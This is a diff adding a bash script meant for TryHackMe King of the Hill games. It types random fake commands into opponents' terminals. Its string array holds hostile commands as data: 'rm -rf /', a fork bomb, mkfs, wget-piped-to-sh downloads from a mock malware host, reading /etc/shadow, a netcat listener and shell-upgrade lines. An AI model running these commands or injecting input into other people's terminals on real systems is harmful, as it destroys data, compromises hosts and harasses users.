@@ -1,0 +1,72 @@
+#!/bin/bash
+
+# TryHackMe King of the Hill - Random Command Typer
+# Sends strings chosen randomly from an array to all opponent's TTY outputs
+# Ryan McMillan 2022
+
+echo -e "\033[0;35m"
+echo "  ▄████  ██░ ██  ▒█████    ██████ ▄▄▄█████▓    █     █░ ██▀███   ██▓▄▄▄█████▓▓█████  ██▀███  "
+echo " ██▒ ▀█▒▓██░ ██▒▒██▒  ██▒▒██    ▒ ▓  ██▒ ▓▒   ▓█░ █ ░█░▓██ ▒ ██▒▓██▒▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒"
+echo "▒██░▄▄▄░▒██▀▀██░▒██░  ██▒░ ▓██▄   ▒ ▓██░ ▒░   ▒█░ █ ░█ ▓██ ░▄█ ▒▒██▒▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒"
+echo "░▓█  ██▓░▓█ ░██ ▒██   ██░  ▒   ██▒░ ▓██▓ ░    ░█░ █ ░█ ▒██▀▀█▄  ░██░░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄  "
+echo "░▒▓███▀▒░▓█▒░██▓░ ████▓▒░▒██████▒▒  ▒██▒ ░    ░░██▒██▓ ░██▓ ▒██▒░██░  ▒██▒ ░ ░▒████▒░██▓ ▒██▒"
+echo " ░▒   ▒  ▒ ░░▒░▒░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░  ▒ ░░      ░ ▓░▒ ▒  ░ ▒▓ ░▒▓░░▓    ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░"
+echo "  ░   ░  ▒ ░▒░ ░  ░ ▒ ▒░ ░ ░▒  ░ ░    ░         ▒ ░ ░    ░▒ ░ ▒░ ▒ ░    ░     ░ ░  ░  ░▒ ░ ▒░"
+echo "░ ░   ░  ░  ░░ ░░ ░ ░ ▒  ░  ░  ░    ░           ░   ░    ░░   ░  ▒ ░  ░         ░     ░░   ░ "
+echo "      ░  ░  ░  ░    ░ ░        ░                  ░       ░      ░              ░  ░   ░     "
+echo
+echo "Send fake inputs to opponents terminals in TryHackMe King of the Hill matches."
+echo "Ryan McMillan 2022"
+echo -e "\033[0m"
+echo
+
+#Create an array of common "commands" and strings to send to victims
+COMMANDS=( $PATH $PWD $OLD_PWD $HOME $SHELL $TERM $USER $SHELL $LANG "cd" "ls -l" "ls -la" "cd .." "cd ../../" "cd ../../../../../" "cd ../../../../../../../../../../../../" "cd ../../../../../../../../../../../../../../../../../../../../../../../../" "cat /root/root.txt" "cat flag.txt" "cat flag69.txt" "cat /etc/passwd" "sudo cat /etc/shadow" "echo 'Rizz0' > /root/king.txt" "mkdir linux_isos" "mkdir homework" "THM{5uG0n_D33z_NU7z}" "THM{WH47_A_N3RD}" "THM{412ad395df74382c39842b34}" "THM{c7b92f34f6920a9e82572083}" "sudo rm -rf / *" ":(){:|:&};:" "sudo mv /* /dev/null" "sudo mkfs ext3 /dev/sda3" "sudo wget http://v1rus3sRus.m4lw4r3.ru:8080/w0rm.sh -O- | sh" "sudo wget http://v1rusesRus.m4lw4r3.ru:443/tr0j4n.exe -O- | sh" "C:    C:\DOS      C:\DOS\RUN          RUN DOS RUN" "sudo ./h4ck_th3_m41nfr4m3.sh" "This is our world now. The world of the electron and the switch; the beauty of the baud. We exist without nationality, skin color, or religious bias. You wage wars, murder, cheat, lie to us and try to make us believe it's for our own good, yet we're the criminals. Yes, I am a criminal. My crime is that of curiosity. I am a hacker, and this is my manifesto.' Huh? Right? Manifesto? 'You may stop me, but you can't stop us all." "Alright, I'm in." "www-data" "I am ROOT" "touch yourself.txt" "touch me_down_there.csv" "Hey, handsome." "firewall --disable" "anti-virus.disable()" "sh -it" "echo 'hunter2' | sudo passwd" "wget https://c.xkcd.com/random/comic/" "wget http://bash.org/?top" "nc -nlvp 5555" "There's no place like 127.0.0.1" "chmod +x linpeas.sh" "./linpeas.sh" "Pwnd." "HACK THE PLANET!!!" "All your base are belong to us." "sudo chmod +x pwncat && ./pwncat" "python3 -m SimpleHTTPServer 80" "which python" "python3 -c 'import pty; pty.spawn(/bin/bash)'" "stty raw -echo && fg" "")
+
+# Find local tty
+LOCAL_TTY=$(tty)
+
+
+# Add all ttys in /dev/pts to an array, remove ptmx   
+TTY_ARRAY=(/dev/pts/*)
+for i in ${!TTY_ARRAY[@]}; do
+	if [ "${TTY_ARRAY[$i]}" == "/dev/pts/ptmx" ]; then
+		unset TTY_ARRAY[$i]
+	elif [ "${TTY_ARRAY[$i]}" == "$LOCAL_TTY" ]; then
+	    unset TTY_ARRAY[$i]
+	fi
+done
+
+# Show user our tty number and the list of other active ttys
+echo -e '\033[0;32m'
+echo "This tty: $LOCAL_TTY"
+echo -e '\033[0m'
+echo "Active ttys: [${TTY_ARRAY[@]}]"
+echo -e "\033[0;31m"
+
+# pwn function created so it can be sent to background with &
+# enables multiple processes to be created 
+ghost_write(){
+    # Generate a random integer between 0 and the size of the commands array
+    declare -i num=$[$RANDOM % ${#COMMANDS[@]}]
+    # pipe what output was sent to which TTY to our local TTY
+    echo "$dir: ${COMMANDS[$num]}" > $LOCAL_TTY
+    echo > $LOCAL_TTY
+    # Pipe messages to each Active TTY character by character at random intervals to simulate typing
+    for (( i=0; i<${#COMMANDS[ $num ]}; i++ ))
+    do
+        exec &> >(echo -n "${COMMANDS[ $num ]:$i:1}" >& $dir) && sleep $[ ($RANDOM % 110) / 100 ]
+    done
+    echo > $dir
+
+}
+
+
+# Iterate over the array of available TTYs
+for dir in "${TTY_ARRAY[@]}"
+do 
+    # If not our tty, start a backgrounded ghost writing session
+    if [ "$LOCAL_TTY" != "$dir" ]; then
+        ghost_write& 
+    fi
+done
